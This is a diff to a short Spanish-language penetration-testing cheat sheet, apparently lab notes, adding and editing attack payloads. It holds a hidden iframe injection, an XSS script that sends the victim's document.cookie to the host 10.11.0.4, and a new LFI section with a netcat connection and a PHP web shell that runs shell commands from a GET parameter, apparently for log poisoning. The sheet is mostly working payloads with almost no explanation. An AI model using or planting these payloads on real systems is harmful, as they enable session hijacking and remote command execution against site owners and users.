@@ -30,10 +30,17 @@ C:\xampp\xampp_stop.exe
 
 #### Content Injection
 ```
-<iframe src=http://10.11.0.4/report height=”0” width=”0”></iframe> 
+<iframe src=http://10.11.0.4/report height="0" width=”0”></iframe> 
 ```
 
 #### Robo de cookies e información de sesión
 ```
 <script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script> 
+```
+
+### LFI
+```
+APACHE LOG
+nc -nv 10.11.0.22 80
+<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
 ```
